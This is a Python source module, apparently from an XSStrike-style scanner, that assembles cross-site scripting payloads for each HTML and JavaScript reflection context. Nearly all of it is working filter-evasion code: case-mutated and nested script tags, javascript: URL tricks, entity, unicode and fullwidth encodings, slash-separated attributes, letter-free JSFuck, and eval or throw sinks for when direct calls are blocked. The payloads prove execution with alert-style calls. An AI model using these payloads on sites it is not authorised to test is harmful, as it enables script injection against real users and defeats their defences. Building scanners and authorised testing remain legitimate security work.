"""
Context-dispatched XSS payload composition engine (XSStrike genGen model).

Replaces the monolithic 500-line `compose()` function with a structured
`ComposeState` container and per-context strategy handlers while keeping the
exact candidate emission order, efficiency gating, and case-library references.
"""
from __future__ import annotations

import re
from typing import Any, Callable, Iterable

from .constants import (
    DIALOG_FUNCS,
    GEN_EV,
    INNER_QUOTE_CTXS,
     SINK_FALLBACK_FUNCS,
    TAG_HANDLERS,
)
from .obfuscators import (
    _throw_forms,
    _throw_ops,
    avail_funcs,
    bracket_funcs,
    encoded_funcs,
    indirect_call_funcs,
    jsfuck_funcs,
    junction_ok,
    min_eff,
    noparens_funcs,
    required_ok,
    split_str,
    u6_funcs,
    u_fname,
    u_funcs,
    usable,
)
from .types import ComposeState

_FN_NAME_SPLIT_RE = re.compile(r"[(?`]")


# --- State helpers (formerly nested closures inside compose) -----------------


def _rebuild_name(
    name: str, s: str, kw: dict[str, bool]
) -> list[str]:
    """Call forms for one dialog name split by removed string `s`."""
    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
    arg = "()" if name == "print" else "(1)"
    sp = split_str(name, s)
    if parens:
        return [f"{sp}{arg}"]
    if btick:
        return [f"{sp}`1`"]
    return _throw_forms(sp, kw, include_block_fallback=True)


def _rebuild_fn(s: str, kw: dict[str, bool]) -> list[str]:
    """Rebuild all 4 dialog functions using removed-string splitter `s`."""
    return [
        f
        for name in DIALOG_FUNCS
        for f in _rebuild_name(name, s, kw)
    ]


def _sink_fns(kw: dict[str, bool]) -> list[str]:
    """Last-resort sinks (`eval`, `setTimeout`, `Function`, `fetch`, `open`)
    when every dialog name AND every call syntax is blocked."""
    return [
        tf
        for n in SINK_FALLBACK_FUNCS
        for tf in _throw_forms(n, kw, include_block_fallback=True)
    ]


def _rebuild_all(
    rsplit: list[str], scores: dict[str, int], kw: dict[str, bool]
) -> list[str]:
    """Name-major rebuild order across all deleted-string splitters."""
    return [
        f
        for name in DIALOG_FUNCS
        for s in rsplit
        if required_ok(s, scores)
        for f in _rebuild_name(name, s, kw)
        if required_ok(f, scores)
    ]


def _add_candidate(
    state: ComposeState,
    payload: str,
    technique: str,
    case_ref: str,
    allow_chars: Iterable[str] | None = None,
) -> None:
    """Gate candidate through `required_ok`, annotate obfuscation technique,
    and append to `state.out`."""
    if not required_ok(payload, state.scores, allow_chars=allow_chars):
        return
    if "&#" in payload:
        technique += " (entity-encoded fn)"
    if "\\u" in payload:
        technique += " (unicode-escaped fn)"
    if (
        "['" in payload
        or '["' in payload
        or "[/" in payload
        or "..toString(" in payload
    ):
        technique += " (bracket-access fn)"
    if (
        "?.(" in payload
        or ")." in payload
        or re.search(r"\([a-z]+\)\(", payload)
        or "(0," in payload
        or "].find(" in payload
        or "Reflect.apply(" in payload
    ):
        technique += " (indirect-call fn)"
    if "[][(" in payload or "(![]+[])" in payload:
        technique += " (dynamic jsfuck)"
    state.out.append(
        {
            "payload": payload,
            "technique": technique,
            "case_ref": case_ref,
            "efficiency": min_eff(payload, state.scores),
        }
    )


def _shape_ok(state: ComposeState, gen_key: str | None, fn: str) -> bool:
    """Composite-probe gate: applies when `fn` uses a direct `ident()` call
    shape that the `gen_*` probe tests. Indirect call forms (`?.(`, `(fn)(`)
    and non-alphanumeric JSFuck (`[][...]`) bypass the `ident(` signature."""
    if "(" not in fn or gen_key is None:
        return True
    if "?.(" in fn or fn.startswith("(") or fn.startswith("["):
        return True
    return state.kw.get(gen_key, True)


def _attr_val(state: ComposeState, fn: str) -> str:
    """Quote an event-handler attribute value when it contains spaces
    (`onerror=...;throw 1`) so HTML tokenization does not split the attribute."""
    if " " not in fn:
        return fn
    for q in ('"', "'"):
        if q not in fn and usable(q, state.scores):
            return f"{q}{fn}{q}"
    return fn


def _handler_variants(state: ComposeState) -> list[tuple[str, str, str]]:
    """Return `(tag, ev, extra)` entries whose dependencies all passed."""
    return [
        (t, e, x)
        for t, e, x, deps in TAG_HANDLERS
        if all(state.kw.get(d, True) for d in deps)
    ]


def _fix_atom(state: ComposeState, key: str, word: str, s: str) -> str:
    """Split `word` with removed string `s` when its `kw` key was blocked."""
    return word if state.kw.get(key, True) else split_str(word, s)


# --- Per-context composition strategies --------------------------------------


def _compose_letter_stripper(state: ComposeState) -> None:
    """Synthesize pure non-alphabetic JSFuck payloads when a letter-stripping
    filter (`/[a-zA-Z]/`) was detected via the numeric fallback probe.

    Embedding `/*{marker}*/` ensures that when a letter-stripper deletes the
    alphabetic marker `vvmxxxxxx`, the residue `/**/` in the response matches
    `_core_payload(marked, marker)` character-for-character during `--verify`.
    """
    ctx = state.ctx
    q = state.quote
    marker = state.marker
    exec_fns = jsfuck_funcs(state.kw, compact=True, eval_source=True)
    str_fns = jsfuck_funcs(state.kw, compact=True, eval_source=False)

    if ctx in ("js_raw", "attr_handler"):
        for fn in exec_fns:
            _add_candidate(
                state,
                f"{fn}/*{marker}*/",
                "non-alphabetic JSFuck execution (letter-stripper bypass)",
                "obfuscation",
            )
        for fn in str_fns:
            _add_candidate(
                state,
                f"{fn}/*{marker}*/",
                "non-alphabetic JSFuck string (eval-sink bypass)",
                "obfuscation",
            )
    elif ctx == "js_string":
        if q and usable(q, state.scores):
            for fn in exec_fns:
                _add_candidate(
                    state,
                    f"{q}-{fn}-{q}",
                    "non-alphabetic JSFuck in-string execution",
                    "js_string_exec",
                )
                if state.slash_ok:
                    _add_candidate(
                        state,
                        f"{q};{fn}/*{marker}*/;//",
                        "non-alphabetic JSFuck string breakout",
                        "js_string_exec",
                    )
    elif ctx == "js_template":
        if state.kw.get("interp", True):
            for fn in exec_fns:
                _add_candidate(
                    state,
                    f"${{{fn}}}/*{marker}*/",
                    "non-alphabetic JSFuck template interpolation",
                    "js_string_exec",
                )
    elif ctx == "js_lcomment":
        if state.kw.get("newline", True):
            for fn in exec_fns:
                _add_candidate(
                    state,
                    f"\n{fn}/*{marker}*/;//",
                    "non-alphabetic JSFuck line-comment breakout",
                    "js_breakout",
                )
    elif ctx == "js_bcomment":
        if state.kw.get("comment_close", True):
            for fn in exec_fns:
                _add_candidate(
                    state,
                    f"*/{fn}/*{marker}*/;//",
                    "non-alphabetic JSFuck block-comment breakout",
                    "js_breakout",
                )


def _compose_html(state: ComposeState) -> None:
    kw = state.kw
    kwv = state.kwv
    rsplit = state.rsplit
    hfuncs = state.hfuncs
    jfuncs = state.jfuncs
    fn_cap = state.fn_cap
    marker = state.marker

    if state.tags_ok:
        if not state.inert:
            if state.script_ok:
                for fn in jfuncs or (
                    _rebuild_fn(rsplit[0], kw) if rsplit else []
                ):
                    if _shape_ok(state, "gen_script", fn):
                        _add_candidate(
                            state,
                            f"<script {marker}>{fn}</script>",
                            "script injection",
                            "body_direct",
                        )
            else:
                if kw.get("case_script", True):
                    for fn in jfuncs[:fn_cap] or (
                        _rebuild_fn(rsplit[0], kw) if rsplit else []
                    ):
                        _add_candidate(
                            state,
                            f"<ScRiPt {marker}>{fn}</ScRiPt>",
                            "case-mutated script tag",
                            "tag_removed",
                        )
                for s in rsplit[:3]:
                    for fn in jfuncs[:fn_cap] or _rebuild_fn(s, kw):
                        _add_candidate(
                            state,
                            f"{split_str('<script>', s)}{fn}/*{marker}*/"
                            f"{split_str('</script>', s)}",
                            f"nested tag-strip bypass ({s} splitter)",
                            "tag_removed",
                        )

        for tag, ev, extra, deps in TAG_HANDLERS:
            if all(kw.get(d, True) for d in deps) and state.space_ok:
                for fn in hfuncs[:fn_cap]:
                    if _shape_ok(state, GEN_EV.get(ev), fn):
                        _add_candidate(
                            state,
                            f"<{tag} {extra} {marker} {ev}={_attr_val(state, fn)}>".replace(
                                "  ", " "
                            ),
                            f"{tag} {ev} handler",
                            "body_direct",
                        )
            elif (
                not state.space_ok
                and state.slash_ok
                and kw.get(f"{tag}_tag", True)
                and kw.get(ev, True)
            ):
                s_extra = "src" if extra == "src=x" else extra
                for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
                    parts = [f"<{tag}", s_extra, marker, f"{ev}={fn}>"]
                    _add_candidate(
                        state,
                        "/".join(p for p in parts if p),
                        f"slash-separated {tag} {ev} handler (space bypass)",
                        "body_direct",
                    )
            else:
                # If atoms (`<tag>` and `on*`) passed and ONLY the `pair_*`
                # space-separated junction failed, `/` separates attributes
                # without needing a deleted-string splitter.
                atom_blocked = any(
                    not kw.get(d, True)
                    for d in deps
                    if not d.startswith("pair_")
                )
                if not atom_blocked and state.slash_ok:
                    s_extra = "src" if extra == "src=x" else extra
                    for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
                        parts = [f"<{tag}", s_extra, marker, f"{ev}={fn}>"]
                        _add_candidate(
                            state,
                            "/".join(p for p in parts if p),
                            f"slash-separated {tag} {ev} handler (pair-junction bypass)",
                            "body_direct",
                        )
                for s in rsplit[:2]:
                    tag_atom = (
                        _fix_atom(state, tag + "_tag", "<" + tag, s)
                        if atom_blocked
                        else split_str("<" + tag, s)
                    )
                    fallback_fns = [
                        (
                            r.replace("onerror=", "self.onerror=", 1)
                            if "onerror=" in r and "self.onerror=" not in r
                            else r
                        )
                        for r in _rebuild_fn(s, kw)
                    ]
                    for fn0 in hfuncs[:fn_cap] or fallback_fns:
                        if (
                            ";" in fn0
                            or "=" in fn0
                            or fn0.startswith(("(", "["))
                            or "?.(" in fn0
                            or "/**/" in fn0
                            or ".find(" in fn0
                            or "Reflect.apply(" in fn0
                        ):
                            _add_candidate(
                                state,
                                f"{tag_atom} {extra} {marker} "
                                f"{_fix_atom(state, ev, ev, s)}={_attr_val(state, fn0)}>".replace(
                                    "  ", " "
                                ),
                                f"removed-string splitter ({s})",
                                "tag_removed",
                            )
                            continue
                        fname = _FN_NAME_SPLIT_RE.split(fn0)[0]
                        _add_candidate(
                            state,
                            f"{tag_atom} {extra} {marker} "
                            f"{_fix_atom(state, ev, ev, s)}="
                            f"{_fix_atom(state, fname, fname, s)}{fn0[len(fname):]}>".replace(
                                "  ", " "
                            ),
                            f"removed-string splitter ({s})",
                            "tag_removed",
                        )

        if kw.get("javascript_proto", True) and kw.get("proto_href", True):
            for fn in jfuncs[:fn_cap]:
                if _shape_ok(state, "gen_jsurl", fn):
                    _add_candidate(
                        state,
                        f'<a {marker} href="javascript:{fn}">XSS</a>',
                        "javascript: protocol href",
                        "protocol",
                    )
        elif kw.get("javascript_proto", True) and not kw.get("proto_href", True):
            # `javascript:` is allowed, but `href=javascript:` junction is blocked
            for fn in jfuncs[:fn_cap]:
                if state.space_ok:
                    _add_candidate(
                        state,
                        f'<a {marker} href=" javascript:{fn}">XSS</a>',
                        "whitespace-prefixed javascript: href (junction bypass)",
                        "protocol",
                    )
                if kw.get("case_proto", True):
                    _add_candidate(
                        state,
                        f'<a {marker} href="JaVaScRiPt:{fn}">XSS</a>',
                        "case-mutated javascript: href",
                        "protocol",
                    )
                if kw.get("char_ref", True):
                    _add_candidate(
                        state,
                        f'<a {marker} href="&#106;avascript:{fn}">XSS</a>',
                        "entity-encoded javascript: href (junction bypass)",
                        "protocol",
                    )
        if not kw.get("javascript_proto", True) and kw.get("case_proto", True):
            for fn in jfuncs[:fn_cap]:
                _add_candidate(
                    state,
                    f'<a {marker} href="JaVaScRiPt:{fn}">XSS</a>',
                    "case-mutated javascript: href",
                    "protocol",
                )
        jfns = jfuncs[:fn_cap] or (
            _rebuild_fn(rsplit[0], kw) if rsplit else []
        )
        if not kw.get("javascript_proto", True) and rsplit and jfns:
            for jfn in jfns:
                _add_candidate(
                    state,
                    f'<a {marker} href="{split_str("javascript:", rsplit[0])}'
                    f'{jfn}">XSS</a>',
                    f"removed-string splitter ({rsplit[0]})",
                    "tag_removed",
                )
        if (
            kw.get("svg_tag", True)
            and not kw.get("onload", True)
            and kw.get("case_onload", True)
        ):
            for fn in hfuncs[:fn_cap]:
                _add_candidate(
                    state,
                    f"<svg {marker} OnLoAd={_attr_val(state, fn)}>",
                    "case-mutated onload handler",
                    "body_direct",
                )
        if (
            kw.get("entity_lt", True)
            and kw.get("srcdoc", True)
            and kw.get("iframe_tag", True)
            and (
                not kw.get("parentheses", True)
                or not state.script_ok
                or not kw.get("alert", True)
            )
        ):
            src_fn = (
                "alert" if kw.get("alert", True) else u_fname("alert")
            )
            _add_candidate(
                state,
                f"<iframe {marker} srcdoc=&lt;script&gt;{src_fn}&lpar;1&rpar;&lt;&sol;script&gt;></iframe>",
                "iframe srcdoc entity-encoded",
                "special_attrs",
            )

    elif (
        usable("<", state.scores)
        and not usable(">", state.scores)
        and hfuncs
    ):
        def _name_ok(key: str) -> bool:
            if kw.get(key, True):
                return True
            e, g = kwv.get(key, ("", ""))
            return bool(e) and g == e.replace(">", "")

        slash_handlers = sorted(
            TAG_HANDLERS, key=lambda th: (th[0] != "svg", th[2] != "")
        )
        for tag, ev, extra, deps in (
            TAG_HANDLERS if state.space_ok else slash_handlers
        ):
            others = [d for d in deps if d != deps[0]]
            if (
                _name_ok(deps[0])
                and all(kw.get(d, True) for d in others)
                and state.space_ok
            ):
                for fn in hfuncs[:fn_cap]:
                    _add_candidate(
                        state,
                        f"<{tag} {extra} {marker} {ev}={fn}//".replace(
                            "  ", " "
                        ),
                        f"no greater-than ({tag} {ev})",
                        "gt_missing",
                    )
            elif (
                not state.space_ok
                and state.slash_ok
                and _name_ok(deps[0])
                and kw.get(ev, True)
            ):
                s_extra = "src" if extra == "src=x" else extra
                for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
                    parts = [f"<{tag}", s_extra, marker, f"{ev}={fn}//"]
                    _add_candidate(
                        state,
                        "/".join(p for p in parts if p),
                        f"slash-separated no greater-than ({tag} {ev})",
                        "gt_missing",
                    )
    else:
        durl_lt = kwv.get("double_url_lt", ("", ""))[1] == "<"
        fw_lt = kwv.get("fullwidth_lt", ("", ""))[1] == "<"
        for active, lt_rep, gt_rep, label in (
            (durl_lt, "%3c", "%3e", "double URL-decoded angle bypass"),
            (fw_lt, "\uff1c", "\uff1e", "Unicode fullwidth NFKC angle bypass"),
        ):
            if not active:
                continue
            for fn in hfuncs[:fn_cap]:
                _add_candidate(
                    state,
                    f"{lt_rep}svg {marker} onload={_attr_val(state, fn)}{gt_rep}",
                    label,
                    "body_direct",
                    allow_chars={"<", ">"},
                )
                _add_candidate(
                    state,
                    f"{lt_rep}img src=x {marker} onerror={_attr_val(state, fn)}{gt_rep}",
                    label,
                    "body_direct",
                    allow_chars={"<", ">"},
                )
            if not state.inert:
                for fn in jfuncs[:fn_cap]:
                    _add_candidate(
                        state,
                        f"{lt_rep}script {marker}{gt_rep}{fn}{lt_rep}/script{gt_rep}",
                        label,
                        "body_direct",
                        allow_chars={"<", ">"},
                    )


def _compose_attr(state: ComposeState) -> None:
    quote = state.quote
    marker = state.marker
    fn_cap = state.fn_cap
    hfuncs = state.hfuncs
    jfuncs = state.jfuncs
    kw = state.kw

    if state.tags_ok and state.q_ok and quote:
        for tag, ev, extra in _handler_variants(state):
            for fn in hfuncs[:fn_cap]:
                if _shape_ok(state, GEN_EV.get(ev), fn) and state.space_ok:
                    _add_candidate(
                        state,
                        f"{quote}><{tag} {extra} {marker} {ev}={_attr_val(state, fn)}>".replace(
                            "  ", " "
                        ),
                        "attribute breakout -> tag",
                        "breakout_tag",
                    )
        if not state.space_ok and state.slash_ok:
            for tag, ev, extra, _deps in TAG_HANDLERS:
                if kw.get(f"{tag}_tag", True) and kw.get(ev, True):
                    s_extra = "src" if extra == "src=x" else extra
                    for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
                        parts = [
                            f"{quote}><{tag}",
                            s_extra,
                            marker,
                            f"{ev}={fn}>",
                        ]
                        _add_candidate(
                            state,
                            "/".join(p for p in parts if p),
                            "slash-separated attribute breakout -> tag",
                            "breakout_tag",
                        )
        if state.script_ok and jfuncs and state.space_ok:
            for fn in jfuncs[:fn_cap]:
                if _shape_ok(state, "gen_script", fn):
                    _add_candidate(
                        state,
                        f"{quote}><script {marker}>{fn}</script>",
                        "attribute breakout -> script",
                        "breakout_tag",
                    )
    elif state.q_ok:
        sep = quote if quote else " "
        if hfuncs and kw.get("autofocus", True) and kw.get("onfocus", True):
            if state.space_ok:
                for fn in hfuncs[:fn_cap]:
                    if quote or " " not in fn:
                        _add_candidate(
                            state,
                            f"{sep} autofocus onfocus={sep}{fn}"
                            if quote
                            else f" autofocus onfocus={fn} accesskey=x",
                            "in-context attribute injection",
                            "attr_inject",
                        )
            elif state.slash_ok and quote:
                for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
                    _add_candidate(
                        state,
                        f"{quote}/autofocus/onfocus={quote}{fn}",
                        "slash-separated attribute injection (space bypass)",
                        "attr_inject",
                    )


def _compose_attr_handler(state: ComposeState) -> None:
    marker = state.marker
    for fn in state.hfuncs:
        _add_candidate(
            state, f"{fn}/*{marker}*/", "in-handler direct call", "attr_inject"
        )
    if state.quote and state.q_ok:
        for fn in state.hfuncs[: state.fn_cap]:
            _add_candidate(
                state,
                f"{state.quote});{fn}/*{marker}*/;//",
                "handler close-call breakout",
                "breakout_tag",
            )


def _compose_attr_url(state: ComposeState) -> None:
    quote = state.quote
    marker = state.marker
    fn_cap = state.fn_cap
    if state.tags_ok and state.q_ok and quote:
        for tag, ev, extra in _handler_variants(state):
            for fn in state.hfuncs[:fn_cap]:
                if _shape_ok(state, GEN_EV.get(ev), fn):
                    _add_candidate(
                        state,
                        f"{quote}><{tag} {extra} {marker} {ev}={fn}>".replace(
                            "  ", " "
                        ),
                        "url-attr breakout -> tag",
                        "breakout_tag",
                    )
    if state.kw.get("javascript_proto", True):
        for fn in state.jfuncs:
            if _shape_ok(state, "gen_jsurl", fn):
                _add_candidate(
                    state,
                    f"javascript:{fn}/*{marker}*/",
                    "javascript: URL direct",
                    "protocol",
                )
    elif state.kw.get("case_proto", True):
        for fn in state.jfuncs[:fn_cap]:
            _add_candidate(
                state,
                f"JaVaScRiPt:{fn}/*{marker}*/",
                "case-mutated javascript: URL direct",
                "protocol",
            )


def _compose_attr_srcdoc(state: ComposeState) -> None:
    if state.kw.get("entity_lt", True):
        for fn in state.jfuncs:
            _add_candidate(
                state,
                f"&lt;script&gt;{state.marker}{fn}&lt;/script&gt;",
                "srcdoc entity HTML",
                "special_attrs",
            )


def _compose_js_raw(state: ComposeState) -> None:
    marker = state.marker
    if state.js_breakout and state.slash_ok:
        for fn in state.jfuncs[: state.fn_cap]:
            _add_candidate(
                state,
                f"{state.js_breakout};{fn}/*{marker}*/;//",
                f"structural JS closer ({state.js_breakout})",
                "js_string_exec",
            )
    for fn in state.jfuncs:
        _add_candidate(
            state, f"{fn}/*{marker}*/", "raw JS direct call", "js_string_exec"
        )
    for fn in state.jfuncs[: state.fn_cap]:
        _add_candidate(
            state,
            f");{fn}/*{marker}*/;//",
            "raw JS close-call",
            "js_string_exec",
        )


def _compose_js_template(state: ComposeState) -> None:
    marker = state.marker
    expr_fns = [
        fn for fn in state.jfuncs if ";" not in fn and "throw" not in fn
    ]
    if state.kw.get("interp", True):
        for fn in expr_fns:
            _add_candidate(
                state,
                f"${{{fn}}}/*{marker}*/",
                "template-literal interpolation",
                "js_string_exec",
            )
    if state.quote == "`" and state.q_ok:
        for fn in expr_fns[: state.fn_cap]:
            _add_candidate(
                state,
                f"`+{fn}+`/*{marker}*/",
                "literal concat breakout",
                "js_string_exec",
            )


def _compose_js_lcomment(state: ComposeState) -> None:
    if state.kw.get("newline", True):
        for fn in state.jfuncs:
            _add_candidate(
                state,
                f"\n{fn}/*{state.marker}*/;//",
                "line-comment close + exec",
                "js_breakout",
            )


def _compose_js_bcomment(state: ComposeState) -> None:
    if state.kw.get("comment_close", True):
        for fn in state.jfuncs:
            _add_candidate(
                state,
                f"*/{fn}/*{state.marker}*/;//",
                "block-comment close + exec",
                "js_breakout",
            )


def _compose_js_string(state: ComposeState) -> None:
    quote = state.quote
    kw = state.kw
    kwv = state.kwv
    jfuncs = state.jfuncs
    fn_cap = state.fn_cap
    marker = state.marker

    if (
        state.tags_ok
        and state.slash_ok
        and state.script_ok
        and kw.get("close_script", True)
    ):
        for fn in jfuncs[:fn_cap]:
            if _shape_ok(state, "gen_script", fn):
                _add_candidate(
                    state,
                    f"</script><script {marker}>{fn}</script>//",
                    "script tag breakout",
                    "js_breakout",
                )
    elif (
        state.tags_ok
        and state.slash_ok
        and not kw.get("close_script", True)
        and kw.get("case_script", True)
    ):
        for fn in jfuncs[:fn_cap]:
            _add_candidate(
                state,
                f"</ScRiPt><ScRiPt {marker}>{fn}</ScRiPt>//",
                "case-mutated script tag breakout",
                "js_breakout",
            )
    elif state.q_ok and quote:
        brk = (
            "js_break_squote"
            if quote == "'"
            else "js_break_dquote"
            if quote == '"'
            else None
        )
        genbrk = (
            "gen_break_squote"
            if quote == "'"
            else "gen_break_dquote"
            if quote == '"'
            else None
        )
        if genbrk in kw:
            if kw[genbrk]:
                fns = jfuncs
            elif brk and junction_ok(brk, kw, kwv):
                fns = [
                    f
                    for f in jfuncs
                    if "(" not in f
                    or "?.(" in f
                    or f.startswith("(")
                    or f.startswith("[")
                ]
            else:
                fns = []
        elif not brk or junction_ok(brk, kw, kwv):
            fns = jfuncs
        else:
            fns = []
        for fn in fns:
            if ";" not in fn and "throw" not in fn:
                _add_candidate(
                    state,
                    f"{quote}-{fn}-{quote}",
                    "in-string JS execution",
                    "js_string_exec",
                )
        if state.js_breakout and len(state.js_breakout) > len(quote) and state.slash_ok:
            for fn in jfuncs[:fn_cap]:
                _add_candidate(
                    state,
                    f"{state.js_breakout};{fn}/*{marker}*/;//",
                    f"structural JS closer ({state.js_breakout})",
                    "js_string_exec",
                )
        elif state.slash_ok:
            for fn in jfuncs[:fn_cap]:
                _add_candidate(
                    state,
                    f"{quote};{fn}/*{marker}*/;//",
                    "statement JS string breakout",
                    "js_string_exec",
                )
    elif quote and quote in state.escaped_q and state.scores.get("\\", 0) >= 50:
        allow_esc = {quote, "\\"}
        for fn in jfuncs[:fn_cap]:
            _add_candidate(
                state,
                f"\\{quote}-{fn}-\\{quote}",
                "escaped-quote in-string JS execution",
                "js_string_exec",
                allow_chars=allow_esc,
            )
            if (
                state.js_breakout
                and len(state.js_breakout) > len(quote)
                and state.slash_ok
            ):
                _add_candidate(
                    state,
                    f"\\{state.js_breakout};{fn}/*{marker}*/;//",
                    f"escaped structural JS closer (\\{state.js_breakout})",
                    "js_string_exec",
                    allow_chars=allow_esc,
                )
            elif state.slash_ok:
                _add_candidate(
                    state,
                    f"\\{quote};{fn}/*{marker}*/;//",
                    "escaped-quote JS breakout",
                    "js_string_exec",
                    allow_chars=allow_esc,
                )


def _compose_consuming(state: ComposeState) -> None:
    tag = state.ctx.split(":", 1)[1]
    kw = state.kw
    fn_cap = state.fn_cap
    marker = state.marker
    if state.tags_ok and state.slash_ok and kw.get(f"close_{tag}", True):
        if state.script_ok and state.jfuncs:
            for fn in state.jfuncs[:fn_cap]:
                if _shape_ok(state, "gen_script", fn):
                    _add_candidate(
                        state,
                        f"</{tag}><script {marker}>{fn}</script>",
                        f"{tag} close + script",
                        "tag_breakout",
                    )
        if kw.get("img_tag", True) and kw.get("onerror", True) and state.hfuncs:
            for fn in state.hfuncs[:fn_cap]:
                if _shape_ok(state, "gen_h_error", fn):
                    _add_candidate(
                        state,
                        f"</{tag}><img src=x {marker} onerror={fn}>",
                        f"{tag} close + img onerror",
                        "tag_breakout",
                    )
                    _add_candidate(
                        state,
                        f'<{tag}><img title="{marker}</{tag}><img src onerror={fn}>"></{tag}>',
                        f"{tag} consuming-tag trick",
                        "comment_break",
                    )


def _compose_comment(state: ComposeState) -> None:
    kw = state.kw
    marker = state.marker
    fn_cap = state.fn_cap
    if (
        state.tags_ok
        and state.hfuncs
        and kw.get("svg_tag", True)
        and kw.get("onload", True)
    ):
        if state.space_ok and kw.get("pair_svg_onload", True):
            for fn in state.hfuncs[:fn_cap]:
                if _shape_ok(state, "gen_handler", fn):
                    _add_candidate(
                        state,
                        f"--><svg {marker} onload={fn}>",
                        "comment breakout",
                        "comment_break",
                    )
        elif (not state.space_ok or not kw.get("pair_svg_onload", True)) and state.slash_ok:
            for fn in [f for f in state.hfuncs if " " not in f][:fn_cap]:
                _add_candidate(
                    state,
                    f"--><svg/{marker}/onload={fn}>",
                    "slash-separated comment breakout (space bypass)",
                    "comment_break",
                )


_CONTEXT_STRATEGIES: dict[str, Callable[[ComposeState], None]] = {
    "html": _compose_html,
    "attr": _compose_attr,
    "attr_handler": _compose_attr_handler,
    "attr_url": _compose_attr_url,
    "attr_srcdoc": _compose_attr_srcdoc,
    "js_raw": _compose_js_raw,
    "js_template": _compose_js_template,
    "js_lcomment": _compose_js_lcomment,
    "js_bcomment": _compose_js_bcomment,
    "js_string": _compose_js_string,
    "comment": _compose_comment,
}


def compose(
    ctx: str,
    quote: str,
    scores: dict[str, int],
    kw: dict[str, bool] | None = None,
    kwv: dict[str, tuple[str, str]] | None = None,
    inert: bool = False,
    fn_cap: int = 2,
    escaped_q: set[str] | None = None,
    js_breakout: str = "",
    deny: bool = False,
    letter_stripper: bool = False,
) -> list[dict[str, Any]]:
    """Assemble candidate payloads from grammar primitives for a reflection context."""
    kw_dict = kw or {}
    kwv_dict = kwv or {}
    esc_set = escaped_q or set()

    state = ComposeState(
        ctx=ctx,
        quote=quote,
        scores=scores,
        kw=kw_dict,
        kwv=kwv_dict,
        inert=inert,
        fn_cap=fn_cap,
        escaped_q=esc_set,
        js_breakout=js_breakout,
        deny=deny,
        letter_stripper=letter_stripper,
    )

    state.tags_ok = usable("<", scores) and usable(">", scores)
    state.slash_ok = usable("/", scores)
    state.space_ok = (kw_dict.get("space") is not False) or bool(
        kw_dict.get("pair_img_onerror")
    )
    state.q_ok = quote == "" or usable(quote, scores)
    state.script_ok = kw_dict.get("script_tag", True)

    if letter_stripper:
        _compose_letter_stripper(state)
        return state.out

    funcs = avail_funcs(kw_dict)
    forbid_q = (
        quote if (ctx in INNER_QUOTE_CTXS and quote in ("'", '"')) else None
    )

    splitters = sorted(
        (
            (n, e)
            for n, (e, g) in kwv_dict.items()
            if not kw_dict.get(n, True) and e and g == ""
        ),
        key=lambda p: (p[0] != "rand_tag", "<" not in p[1], p[0]),
    )
    state.rsplit = [s for _, s in splitters]

    ind_funcs = indirect_call_funcs(kw_dict, slash_ok=state.slash_ok)
    np_funcs = noparens_funcs(kw_dict, forbid_q=forbid_q)
    bf_list = bracket_funcs(kw_dict, forbid_q, scores=scores)
    alert_call_blocked = (
        not kw_dict.get("alert", True)
        or not kw_dict.get("call_alert", True)
        or not kw_dict.get("gen_call", True)
    )
    jsf_list = (
        [
            f
            for f in jsfuck_funcs(kw_dict, compact=True)
            if required_ok(f, scores)
        ]
        if alert_call_blocked
        else []
    )

    raw_hfuncs = [
        f
        for f in (
            funcs
            + np_funcs
            + encoded_funcs(kw_dict)
            + u_funcs(kw_dict)
            + u6_funcs(kw_dict)
            + ind_funcs
            + bf_list
            + jsf_list
        )
        if required_ok(f, scores)
    ]
    raw_jfuncs = [
        f
        for f in (
            funcs
            + np_funcs
            + u_funcs(kw_dict)
            + u6_funcs(kw_dict)
            + ind_funcs
            + bf_list
            + jsf_list
        )
        if required_ok(f, scores)
    ]

    if not raw_hfuncs:
        # Try reconstructed `alert(1)` (via deleted-string splitters) and
        # non-alphanumeric JSFuck `alert(1)` FIRST when `(` and `)` are allowed,
        # before falling back to `onerror=eval;throw 1` sink primitives.
        raw_hfuncs = (
            ([] if deny else _rebuild_all(state.rsplit, scores, kw_dict))
            + [
                f
                for f in jsfuck_funcs(kw_dict, compact=True)
                if required_ok(f, scores)
            ]
            + [f for f in _sink_fns(kw_dict) if required_ok(f, scores)]
        )
    if not raw_jfuncs:
        raw_jfuncs = (
            ([] if deny else _rebuild_all(state.rsplit, scores, kw_dict))
            + [
                f
                for f in jsfuck_funcs(kw_dict, compact=True)
                if required_ok(f, scores)
            ]
            + [f for f in _sink_fns(kw_dict) if required_ok(f, scores)]
        )

    def _qualify_handler_onerror(fn: str) -> str:
        if "onerror=" in fn and "self.onerror=" not in fn:
            return fn.replace("onerror=", "self.onerror=", 1)
        return fn

    # Escape `with(this)` shadowing inside inline event handlers (`on*=...`)
    state.hfuncs = [_qualify_handler_onerror(f) for f in raw_hfuncs]
    state.jfuncs = list(raw_jfuncs)

    if ctx.startswith("consuming:"):
        _compose_consuming(state)
    else:
        strategy = _CONTEXT_STRATEGIES.get(ctx)
        if strategy is not None:
            strategy(state)

    return state.out
